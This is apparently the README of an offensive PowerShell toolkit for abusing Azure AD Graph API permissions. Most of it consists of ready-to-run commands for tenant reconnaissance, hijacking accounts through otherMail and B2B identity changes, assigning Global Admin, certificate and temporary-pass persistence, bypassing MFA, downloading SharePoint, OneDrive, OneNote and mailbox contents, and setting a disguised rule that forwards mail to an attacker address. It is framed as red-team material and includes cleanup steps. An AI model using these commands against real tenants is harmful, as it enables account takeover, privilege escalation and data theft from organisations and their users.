# Abuse Azure API Permissions

While reading [blog post](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48) from Any Robbins, I found there was lot of funs to play with Azure.

This script would be good to use when

- Azure Portal was blocked with organization but still allowing query from Graph API with client app "Microsoft Azure PowerShell" or "Azure Active Directory PowerShell" or etc. It helps you to recon
- compromised privileged account like Global Admin. It helps you to persist and collect data by different means
- compromised AAD Sync account [[REF](https://github.com/Hagrid29/DumpAADSyncCreds)] or application owner or application admin or etc. It allow you add credential to service principle and compromise further resources depending on the permission it has


| Least Permission                                             | Tactic                                                    | Abuse                                                        | Abuse Steps                                                  |
| ------------------------------------------------------------ | --------------------------------------------------------- | :----------------------------------------------------------- | ------------------------------------------------------------ |
| Application.Read.All                                         | Recon                                                     | Search for interesting app role assignment such as  RoleManagement.ReadWrite.Directory | Find-AAAInterestingAppRoleAssignment                         |
| RoleManagement.Read.Directory                                | Recon                                                     | Search for privileged directory role assignment such as Global Admin | Find-AAAInterestingDirectoryRoleAssignment                   |
| Application.Read.All                                         | Recon                                                     | Obtain details of service principles                         | Get-AAAApplication, Get-AAAApplicationOwner                  |
| User.Read.All                                                | Recon                                                     | Obtain details of Azure users including registered devices, groups | Get-AAAUser, Get-AAAUserDevices, Get-AAAUserMemberOf         |
| GroupMember.Read.All                                         | Recon                                                     | Obtain details of Azure group                                | Get-AAAGroups, Get-AAAGroupsMembers                          |
| Application.ReadWrite.All                                    | PE (application),  Persistence                            | Add credential to an application                             | New-AAAAppPassword                                           |
| User.ReadWrite.All [[REF-Microsoft permission](https://learn.microsoft.com/en-us/graph/api/resources/users?view=graph-rest-1.0#who-can-update-sensitive-attributes)] | PE (non-admin user)                                       | Hijack Azure account by editing otherMail of target user to convert into  B2B user [[REF-BlackHat USA 2022]( https://dirkjanm.io/assets/raw/US-22-Mollema-Backdooring-and-hijacking-Azure-AD-accounts_final.pdf)] | Set-AAAUserMail, New-AAAUserOtherMails,Send-AAAB2BInvitation |
| User.Invite.All  + User.ManageIdentities.All     *Cleanup: User.Read.All + User.ManageIdentities.All | PE (admin user)                                           | Hijack Azure account by adding B2B identity of target user   | New-AAAUserB2BIdentities, Send-AAAB2BInvitation      *Cleanup: Remove-AAAUserB2BIdentities |
| RoleManagement.ReadWrite.Directory                           | PE (admin user), Persistence                              | Assign application with privileged directory role [[REF-Andy Robbins](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48)] | Set-AAADirectoryRoleMember                                   |
| AppRoleAssignment.ReadWrite.All +  Application.Read.All      | PE (admin user)                                           | Assign application with privileged app role [[REF-Andy Robbins](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48)] | Set-AAAAppRoleAssignments                                    |
| Policy.ReadWrite.AuthenticationMethod +  Organization.ReadWrite.All | PE (admin user), Persistence                              | Configure Certificate-based authentication for organization [[REF-Andy Robbins](https://medium.com/specter-ops-posts/passwordless-persistence-and-privilege-escalation-in-azure-98a01310be3f)] | Set-AAAAutenMethod, New-AAAUserAuthCert                      |
| Policy.ReadWrite.AuthenticationMethod +  UserAuthenticationMethod.ReadWrite.All | PE (admin user, bypass MFA), Defence Evasion, Persistence | Configure Temporary Access Pass for a user                   | Set-AAAAutenMethod, Set-AAAUserAuthTempPass                  |
| Policy.ReadWrite.AuthenticationMethod +  UserAuthenticationMethod.ReadWrite.All | Defence Evasion (bypass MFA)                              | Configure phone sign-in MFA method for a user                | Set-AAAAutenMethod, Set-AAAUserAuthPhoneSignIn, Set-AAAUserAuthPhone |
| Site.Read.All                                                | Data Collection                                           | Read files in SharePoint                                     | Get-AAASite, Get-AAAOneDriveFolder     Get-AAAOneDriveFile   |
| Files.Read.All                                               | Data Collection                                           | Read files in OneDrive                                       | Get-AAAOneDriveFolder, Get-AAAOneDriveFile                   |
| Notes.Read.All                                               | Data Collection                                           | Read content of OneNote                                      | Get-AAAOneNotes, Get-AAAOneNotesContent                      |
| Notes.Read.All                                               | Data Collection                                           | Read content of emails                                       | Get-AAAEmails, Get-AAAEmailAttachments                       |
| MailboxSettings.ReadWrite                                    | Data Collection                                           | Configure mail forwarding rule of a user                     | New-AAAEmailRules                                            |
| [[REF-Microsoft permission](https://learn.microsoft.com/en-us/graph/api/resources/users?view=graph-rest-1.0#who-can-update-sensitive-attributes)] | Persistence                                               | Reset password of a user                                     | Set-AAAUserPassword                                          |



## Get Start

#### Login with Az module

```powershell
Import-Module .\AbuseAzureAPIPermissions.ps1
Install-Module Az
# login with prompt
Get-AAATokenFromAzLogin
# login as service principal
Get-AAATokenFromAzLogin -User "XXX" -Password "XXX" -TenantId "XXX" -ServicePrincipal
# extract data from token
Get-AAADataFromGraphToken
```

#### Login with AADInternals module

AADinternals use client app "Azure Active Directory PowerShell" while this use "Microsoft Azure PowerShell". The reason behind this is "Azure Active Directory PowerShell" may blocked by organization commonly.

```powershell
Import-Module .\AbuseAzureAPIPermissions.ps1
Import-Module .\AADIntAccessToken\AccessToken.ps1
Import-Module .\AADIntAccessToken\AccessToken_utils.ps1
Import-Module .\AADIntAccessToken\CommonUtils.ps1
# login with prompt
Get-AAATokenFromAADInt
# login with device code flow
Get-AAATokenFromAADInt -UseDeviceCode
# Refersh expired token
Get-AAATokenFromAADInt -Refresh
```



## Recon

#### App Role assignment

###### Permission:  Application.Read.All, Application.ReadWrite.OwnedBy, Directory.Read.All, Application.ReadWrite.All, Directory.ReadWrite.All

Search for any interesting app role (e.g., File.Read.All) assigned to service principle

```powershell
Find-AAAInterestingAppRoleAssignment -Application
Find-AAAInterestingAppRoleAssignment -ServicePrinciple
Get-AAAAppRoleAssignments -AppId 'XXXX' -Readable
```

#### Directory Role Assignment

###### Permission: RoleManagement.Read.Directory, Directory.Read.All, RoleManagement.ReadWrite.Directory, Directory.ReadWrite.All

Search for privileged directory role (e.g., Global Admin) assignment

```powershell
Find-AAAInterestingDirectoryRoleAssignment -ServicePrinciple
Find-AAAInterestingDirectoryRoleAssignment -User
Find-AAAInterestingDirectoryRoleAssignment -Guest
$AppAdminTempateId = "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3"
Get-AAADirectoryRoleMember -RoleTemplateId $AppAdminTempateId -filter ServicePrinciple
```

#### Application

###### Permission: Application.Read.All, Application.ReadWrite.OwnedBy, Application.ReadWrite.All, Directory.Read.All, Directory.ReadWrite.All

Get the details (e.g., app URL, owner) of service principles

```powershell
Get-AAAApplication
Get-AAAApplication -ServicePrinciple -AppId 'XXXX'
Get-AAAApplication -Application -Search "citrix"
```

#### User

###### Permission: User.Read.All, User.ReadWrite.All, Directory.Read.All, Directory.ReadWrite.All

Get the details (e.g., registered devices, groups) of user

```powershell
Get-AAAUser
Get-AAAUser -UserId "hagrid29@XXX.onmicrosoft.com"
Get-AAAUser -Search "sync" # search for AAD Sync service account
Get-AAAUserDevices -UserId "hagrid29@XXX.onmicrosoft.com"
Get-AAAUserMemberOf -UserId "hagrid29@XXX.onmicrosoft.com"
```

###### Permission: UserAuthenticationMethod.Read.All, UserAuthenticationMethod.ReadWrite.All

Get authen method of a user

```
Get-AAAUserAuthMethod -UserId "hagrid@XXX.onmicrosoft.com"
```

#### Group

###### Permission: GroupMember.Read.All, Group.Read.All, Directory.Read.All, Group.ReadWrite.All, Directory.ReadWrite.All

Get the details of group

```powershell
Get-AAAGroups
Get-AAAGroups -Search "helpdesk"
Get-AAAGroupMembers -GroupId "XXX"
```



## Privilege Escalation

#### Add Credential to Application (PE to application)

###### Permission: Application.ReadWrite.All

Add password credential for application

```powershell
New-AAAAppPassword -ServicePrinciple -AppId 'XXXX'
# Clean up
Remove-AAAAppPassword -ServicePrinciple -AppId 'XXXX' -KeyId 'XXXX'
```

#### Hijack Azure account - *otherMail* properties (PE to non-admin user)

###### Permission: User.ReadWrite.All, Directory.ReadWrite.All (apply to non-admin user)

Permission of privileged directory role:  [[REF-Microsoft permission](https://learn.microsoft.com/en-us/graph/api/resources/users?view=graph-rest-1.0#who-can-update-sensitive-attributes)]  

Hijack normal Azure account (member without mailbox) by editing *otherMail* of target user to convert into B2B user [[REF-BlackHat USA 2022]( https://dirkjanm.io/assets/raw/US-22-Mollema-Backdooring-and-hijacking-Azure-AD-accounts_final.pdf)]. 

```powershell
# Hijack a member without mailbox
$victim = "hagrid29@XXX.onmicrosoft.com"
$attackerMail = "XXX@external.com" 
$DisplayName = "Tommy Cheung"
Set-AAAUserMail -UserId $victim -mail $attackerMail     
New-AAAUserOtherMails -UserId $victim -otherMails $attackerMail
Send-AAAB2BInvitation -action resendInvitation -UserId $victim -mail $attackerMail
Set-AAAUserDisplayname -UserId $victim -DisplayName $DisplayName   
(Get-AAAUser -UserId $victim).identities

# Hijack a guest account
$victim = "XXX"
$attackerMail = "XXX@external.com" 
Set-AAAUserMail -UserId $victim -mail $attackerMail     
New-AAAUserOtherMails -UserId $victim -otherMails $attackerMail
Send-AAAB2BInvitation -action resetRedemption -UserId $victim -mail $attackerMail

# Hijack a member that had been converted to B2B user already
$victim = "hagrid29@XXX.onmicrosoft.com"
$attackerMail = "XXX@external.com" 
Set-AAAUserMail -UserId $victim -mail $attackerMail
Remove-AAAUserOtherMails -UserId $victim -otherMails $attackerMail
New-AAAUserOtherMails -UserId $victim -otherMails $attackerMail
Send-AAAB2BInvitation -action resetRedemption -UserId $victim -mail $attackerMail

# Clean up
Set-AAAUserMail -UserId "hagrid29@XXX.onmicrosoft.com" -mail "hagrid29@XXX.onmicrosoft.com"   
Remove-AAAUserOtherMails -UserId "hagrid29@XXX.onmicrosoft.com" -otherMails "XXX@external.com"
```

#### Hijack Azure account - *identities* properties (PE to admin user)

###### Permission for inviting user: User.Invite.All, User.ReadWrite.All, Directory.ReadWrite.All

###### Permission for adding new identities:  User.ManageIdentities.All (apply to all user), Directory.ReadWrite.All (apply to non-admin user)

###### Permission for cleaning up: User.Read.All + User.ManageIdentities.All (apply to all user), Directory.ReadWrite.All (apply to non-admin user)

Hijack privileged Azure account (member with/without mailbox) by adding B2B identity of target user

```powershell
# Hijack a member with/without mailbox
$victim = "hagrid29@XXX.onmicrosoft.com"
$attackerMail = "XXX@external.com" 
New-AAAUserB2BIdentities -UserId $victim -mail $attackerMail
Send-AAAB2BInvitation -action sendInvitation -mail $attackerMail -Displayname "Tommy Cheung"

# Clean up
Remove-AAAUserB2BIdentities -UserId "hagrid@XXX.onmicrosoft.com" -mail "XXX@external.com"
```

#### Assign Directory Role (PE to admin user)

###### Permission: RoleManagement.ReadWrite.Directory

Assign privileged directory role (e.g., Global Admin) to target object  [[REF-Andy Robbins](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48)]

```powershell
$TargetObjectId = "XXXX"
$GlobalAdminTempalteId = "62e90394-69f5-4237-9190-012177145e10"
Set-AAADirectoryRoleMember -RoleTemplateId $GlobalAdminTempalteId -TargetObjectId $TargetObjectId
#Clean up
Remove-AAADirectoryRoleMember -RoleTemplateId $GlobalAdminTempalteId -TargetObjectId $TargetObjectId
```

#### Assign App Role (PE to admin user)

###### Permission: AppRoleAssignment.ReadWrite.All and Application.Read.All, AppRoleAssignment.ReadWrite.All and Directory.Read.All

Assign privileged application role (e.g., RoleManagement.ReadWrite.Directory) to target service principle  [[REF-Andy Robbins](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48)]

```powershell
# Assign "Sites.ReadWrite.All" to specific application to access all SharePoint Sites and OneDrive
Set-AAAAppRoleAssignments -AppId 'XXXX' -AppRoleId "9492366f-7969-46a4-8d15-ed1a20078fff"

# Assign "RoleManagement.ReadWrite.Directory" to specific application and assign Global Admin role to itself
$CurrentAppId = "XXXX"
$CurrentObjectId = (Get-AAAApplication -ServicePrinciple -AppId $CurrentAppId).id
$GlobalAdminTempalteId = "62e90394-69f5-4237-9190-012177145e10"
Set-AAAAppRoleAssignments -AppId $CurrentAppId -AppRoleId "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8"
Set-AAADirectoryRoleMember -RoleTemplateId $GlobalAdminTempalteId -TargetObjectId $CurrentObjectId

# Clean up
Remove-AAAAppRoleAssignments -AppId "XXXX" -AssignId "XXXX"
Remove-AAADirectoryRoleMember -RoleTemplateId $GlobalAdminTempalteId -TargetObjectId $CurrentObjectId
```

#### Configure Certificate-based authentication (PE to admin user)

###### Permission for configuring authen method: Policy.ReadWrite.AuthenticationMethod

###### Permission for configuring cert-based authen:  Organization.ReadWrite.All

Configure Certificate-based authentication for organization [[REF-Andy Robbins](https://medium.com/specter-ops-posts/passwordless-persistence-and-privilege-escalation-in-azure-98a01310be3f)]

```powershell
# Enable cert-based authen method for organization
Set-AAAAutenMethod -CertAuth

# Generate and upload cert file
linux# ./AAAUserAuthCert.sh -g crt  
New-AAAUserAuthCert -CertFile ".\ca.crt"

# Generate pfx file to login as hagrid@XXX.onmicrosoft.com. Can install the pfx file locally for authen
linux# ./AAAUserAuthCert.sh -g pfx -u hagrid@XXX.onmicrosoft.com -s "/C=AU/ST=XX/L=XX/O=XXX/OU=IT/CN=hagrid@XXX.onmicrosoft.com"

# Clean up
Set-AAAAutenMethod -CertAuth -Disable
Remove-AAAUserAuthCert -issuerSki "XXXX"
```

#### Configure Temporary Access Pass (PE to admin user, bypass MFA)

###### Permission for configuring authen method: Policy.ReadWrite.AuthenticationMethod

###### Permission for configuring temp access pass authen:  UserAuthenticationMethod.ReadWrite.All

Configure Temporary Access Pass for a user

```powershell
Set-AAAAutenMethod -TempPass
Set-AAAUserAuthTempPass -UserId "hagrid@XXX.onmicrosoft.com"
# Clean up
Remove-AAAUserAuthTempPass -UserId "hagrid@XXX.onmicrosoft.com" -TempPassId "XXXX"
Set-AAAAutenPolicy -TempPass -Disable
```



## Defence Evasion

#### Configure phone sign-in MFA (bypass MFA)

###### Permission for configuring authen method: Policy.ReadWrite.AuthenticationMethod

###### Permission for configuring phone sign-in authen:  UserAuthenticationMethod.ReadWrite.All

Configure phone sign-in MFA method for a user

```powershell
Set-AAAAutenMethod -sms
Set-AAAUserAuthPhone -UserId "hagrid@XXX.onmicrosoft.com" -phoneNumber "+852XXXXXXX"
# Clean up
Remove-AAAUserAuthPhone -UserId "hagrid@XXX.onmicrosoft.com" -phoneNumber "+852XXXXXXX"
Set-AAAAutenPolicy -sms -Disable
```



## Data Collection

#### SharePoint

###### Permission: Sites.Read.All, Sites.ReadWrite.All, Sites.Manage.All, Sites.FullControl.All

List details and download item from a SharePoint site

```powershell
Get-AAASite
Get-AAAOneDriveFolder -SitetId "XXXX"
Get-AAAOneDriveFolder -SitetId "XXXX" -FolderId "XXXX" -showDetails
Get-AAAOneDriveFolder -SitetId "XXXX" -FolderId "XXXX" -recurse | Export-CSV -Encoding UFT8 Result.csv
Get-AAAOneDriveFolder -SitetId "XXXX" -FolderId "XXXX" -Parent
Get-AAAOneDriveFolder -SitetId "XXXX" -FileId "XXXX" -Download
```

#### OneDrive

###### Permission: Files.Read.All, Files.ReadWrite.All, Sites.Read.All, Sites.ReadWrite.All, Sites.Manage.All, Sites.FullControl.All

List details of and download item from a OneDrive of a user

```powershell
Get-AAAOneDriveFolder -UserId "hagrid29@XXX.onmicrosoft.com"
Get-AAAOneDriveFolder -UserId "hagrid29@XXX.onmicrosoft.com" -FolderId "XXXX"
Get-AAAOneDriveFolder -UserId "hagrid29@XXX.onmicrosoft.com" -FileId "XXXX" -Download
```

#### OneNote

###### Permission: Notes.Read.All, Notes.ReadWrite.All

List details of and download One Note items of a user

```powershell
Get-AAAOneNotes -UserId "hagrid29@XXX.onmicrosoft.com"
Get-AAAOneNotesContent -UserId "hagrid29@XXX.onmicrosoft.com" -PageId "XXXX" -OutHTMLFile output.html
```

#### Email

###### Permission: Mail.Read, Mail.ReadWrite

Read emails and download attachments from a mailbox

```powershell
Get-AAAEmails -UserId "hagrid29@XXX.onmicrosoft.com"
Get-AAAEmails -UserId "hagrid29@XXX.onmicrosoft.com" -Search "password" -Top 7
Get-AAAEmails -UserId "hagrid29@XXX.onmicrosoft.com" -MessageId "XXXX"
Get-AAAEmailAttachments -UserId "hagrid29@XXX.onmicrosoft.com" -MessageId "XXXX"
Get-AAAEmailAttachments -UserId "hagrid29@XXX.onmicrosoft.com" -MessageId "XXXX" -AttachmentId "XXXX"
```

#### Create Mail Rule

###### Permission: MailboxSettings.ReadWrite

Create a highest order mail rule to forward all email of a mailbox. Be cautious of detection and alert of mail rule creation for forwarding email to external mailbox.

```powershell
$victim = "hagrid29@XXX.onmicrosoft.com"
$attackerMail = "XXX@XXX.com" 
Get-AAAEmailRules -UserId $victim
New-AAAEmailRules -UserId $victim -MailRuleDisplayName "Reporting Rule" -EmailDisplayName "Tommy Cheung (IT)" -Email $attackerMail
# Clean up
Remove-AAAEmailRules -UserId $victim -MailRuleId "XXXX"
```



## Persistence

#### Reset password

###### Permission of privileged directory role:  [[REF-Microsoft permission](https://learn.microsoft.com/en-us/graph/api/resources/users?view=graph-rest-1.0#who-can-update-sensitive-attributes)]  

Change password of users

```powershell
Set-AAAUserPassword -UserId "hagrid29@XXX.onmicrosoft.com" -password "P@ssw0rd@1112233"
```



## References

* https://github.com/Gerenios/AADInternals
* https://dirkjanm.io/assets/raw/US-22-Mollema-Backdooring-and-hijacking-Azure-AD-accounts_final.pdf
* https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48
* https://medium.com/specter-ops-posts/passwordless-persistence-and-privilege-escalation-in-azure-98a01310be3f

